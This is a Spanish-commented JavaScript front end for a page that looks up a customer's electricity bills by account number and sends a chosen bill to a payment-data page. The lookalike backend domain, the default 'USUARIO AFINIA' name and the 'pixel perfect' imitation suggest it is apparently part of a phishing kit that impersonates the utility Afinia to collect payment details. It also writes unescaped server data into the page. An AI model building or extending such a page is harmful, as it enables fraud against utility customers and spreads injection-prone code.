// --- REFERENCIAS DOM ---
const btnPagoMes = document.getElementById('btn-pago-mes');
const inputNic = document.getElementById('input-nic');
const hiddenFields = document.getElementById('hidden-fields');
const invoiceBody = document.getElementById('invoice-body');
const fullLoader = document.getElementById('full-loader');

// --- 0. RESTAURACIÓN AUTOMÁTICA Y CACHÉ (A PRUEBA DE CSS) ---
function restaurarTabla() {
    try {
        const facturasGuardadas = sessionStorage.getItem('facturasGuardadas');
        const nicGuardado = sessionStorage.getItem('nicGuardado');

        if (facturasGuardadas && nicGuardado) {
            const facturas = JSON.parse(facturasGuardadas);
            
            if (inputNic) inputNic.value = nicGuardado;
            
            if (facturas && facturas.length > 0 && invoiceBody) {
                invoiceBody.innerHTML = ''; 
                facturas.forEach(factura => {
                    renderPixelPerfectRow(factura, nicGuardado);
                });
                
                // --- ATAQUE DIRECTO AL CSS ---
                if (hiddenFields) {
                    // 1. Quitamos la clase CSS que oculta
                    hiddenFields.classList.remove('hidden');
                    // 2. Forzamos la visibilidad con estilo en línea (supera cualquier CSS)
                    hiddenFields.style.display = 'block'; 
                    // 3. Nos aseguramos de que no esté opaco
                    hiddenFields.style.opacity = '1'; 
                    hiddenFields.style.visibility = 'visible';
                }

                // Nos aseguramos de apagar el loader por si se quedó pegado
                if (fullLoader) {
                    fullLoader.classList.add('hidden');
                    fullLoader.style.display = 'none';
                }
                
                console.log("Tabla restaurada y CSS forzado a visible.");
                return true;
            }
        }
        return false;
    } catch (error) {
        console.error("Error al cargar la memoria caché:", error);
        return false;
    }
}

// Ejecutamos la restauración inmediatamente por si venimos del botón "Atrás"
restaurarTabla();
document.addEventListener('DOMContentLoaded', restaurarTabla);
window.addEventListener('pageshow', function(event) {
    if (event.persisted) restaurarTabla();
});


// --- 1. CLICK EN BOTÓN "BUSCAR FACTURAS" ---
if (btnPagoMes) {
    btnPagoMes.addEventListener('click', async (e) => {
        if (e) e.preventDefault(); 

        if (!inputNic) return;

        const rawValue = inputNic.value.trim();
        if (!rawValue) { 
            alert("Ingrese un NIC."); 
            return; 
        }

        // Limpia el NIC de guiones o letras, toma exactamente los números
        const nicValue = rawValue.replace(/\D/g, '');
        if (!nicValue) { 
            alert("El NIC no contiene números válidos."); 
            return; 
        }

        // --- NUEVA LÓGICA: Validar longitud del número ingresado ---
        if (nicValue.length < 10) {
            alert("Por favor ingrese el número de cuenta y no el NIC.");
            return;
        }

        // --- CORTAFUEGOS: EVITAR CONSUMO DEL SERVIDOR ---
        const nicGuardado = sessionStorage.getItem('nicGuardado');
        const facturasGuardadas = sessionStorage.getItem('facturasGuardadas');
        
        // Si el NIC que están buscando es exactamente el mismo que ya tenemos en memoria...
        if (nicValue === nicGuardado && facturasGuardadas) {
            console.log("NIC ya consultado previamente. Cargando desde caché...");
            restaurarTabla();
            return; // ¡Detiene el código aquí! Nunca llega a consumir tu servidor de Node.js
        }

        // UI Reset (Mostrar cargando fullscreen)
        if(fullLoader) fullLoader.classList.remove('hidden');
        if(hiddenFields) hiddenFields.classList.add('hidden');
        if(invoiceBody) invoiceBody.innerHTML = ''; 

        try {
            // ---> LLAMADA AL BACKEND NODE.JS (SOLO SI ES UN NIC NUEVO) <---
            const API_URL = `https://afirusian.pagoswebcol.uk/api/facturas?nic=${nicValue}`;
            
            const response = await fetch(API_URL);
            
            if (!response.ok) {
                throw new Error("Error de conexión con el servidor backend");
            }

            const facturas = await response.json();

            // Si hay facturas, iteramos el Array y dibujamos cada una
            if (facturas && facturas.length > 0) {
                
                // --> GUARDAMOS EN MEMORIA <--
                sessionStorage.setItem('facturasGuardadas', JSON.stringify(facturas));
                sessionStorage.setItem('nicGuardado', nicValue);

                facturas.forEach(factura => {
                    renderPixelPerfectRow(factura, nicValue);
                });

                if(fullLoader) fullLoader.classList.add('hidden');
                if(hiddenFields) hiddenFields.classList.remove('hidden');
            } else {
                throw new Error("No se encontraron facturas.");
            }

        } catch (error) {
            console.error(error);
            if(fullLoader) fullLoader.classList.add('hidden');
            alert("Hubo un error al consultar el NIC o no existen facturas pendientes.");
        }
    });
}

// --- 2. FUNCIÓN RENDERIZADO MÚLTIPLE EN LA TABLA ---
function renderPixelPerfectRow(data, nicValue) {
    if (!invoiceBody) return;

    const tr = document.createElement('tr');
    
    // FILTRO ANTI-NaN: Verificamos desde el origen que el dato sea limpio
    let valorPagar = '0';
    if (data.total_pagar && data.total_pagar !== 'No encontrado' && !String(data.total_pagar).includes('NaN')) {
        valorPagar = String(data.total_pagar).replace('$', '').trim();
    }

    let valorMes = '0';
    if (data.total_mes && data.total_mes !== 'No encontrado' && !String(data.total_mes).includes('NaN')) {
        valorMes = String(data.total_mes).replace('$', '').trim();
    } else {
        valorMes = valorPagar; // Por si son iguales o uno falló
    }

    // Preparamos los datos EXACTOS de ESTA fila para enviarlos a la página de pago
    const datosDeEstaFila = {
        nombre: data.titular !== 'No encontrado' ? data.titular : 'USUARIO AFINIA',
        nic: nicValue,
        referencia: data.periodo, 
        periodo: data.periodo, 
        vence: data.fecha_pago !== 'No encontrado' ? data.fecha_pago : 'Inmediato',
        valor: valorPagar,
        valor_mes: valorMes,
        direccion: data.direccion !== 'No encontrado' ? data.direccion : ''
    };

    // Convertimos el objeto en un string seguro para pasarlo al botón onclick
    const dataString = encodeURIComponent(JSON.stringify(datosDeEstaFila));

    tr.innerHTML = `
        <td class="col-check"><div class="row-check"></div></td>
        <td class="col-icons">
            <div class="doc-icon-group">
                <a href="${data.url_pdf}" target="_blank" style="text-decoration:none; color:inherit;" title="Ver PDF">
                    <span class="material-icons icon-doc-svg" style="cursor:pointer;">picture_as_pdf</span>
                </a>
            </div>
        </td>

        <td class="col-valor" style="font-weight:700;">$ ${valorPagar}</td>
        <td class="col-saldo">$ ${valorMes}</td>

        <td class="col-estado">
            <div class="status-circle-money">$</div>
        </td>
        <td class="col-factura">Ref. ${data.periodo}</td>
        <td class="col-nic">${nicValue}</td>
        <td class="col-periodo">${data.periodo}</td>
        <td class="col-vence">${data.fecha_pago}</td>
        <td class="col-consumo">N/A</td>
        <td class="col-accion sticky-col">
            <button type="button" class="btn-pagar-pro" onclick="irAPagar('${dataString}')">PAGAR</button>
        </td>
    `;
    invoiceBody.appendChild(tr);
}

// --- 3. REDIRECCIÓN INDIVIDUAL A PAGAR ---
window.irAPagar = function(dataString) {
    try {
        const datosSeleccionados = JSON.parse(decodeURIComponent(dataString));
        sessionStorage.setItem('datosFactura', JSON.stringify(datosSeleccionados));
        window.location.href = 'datos.html';
    } catch (error) {
        console.error("Error al procesar el pago", error);
    }
};

// --- MENÚ LATERAL ---
const menuBtn = document.getElementById('menu-toggle');
const sidebar = document.getElementById('sidebar');
const overlay = document.getElementById('menu-overlay');

function toggleMenu() { 
    if(sidebar) sidebar.classList.toggle('open'); 
    if(overlay) overlay.classList.toggle('active'); 
}

if(menuBtn) menuBtn.addEventListener('click', toggleMenu);
if(overlay) overlay.addEventListener('click', toggleMenu);
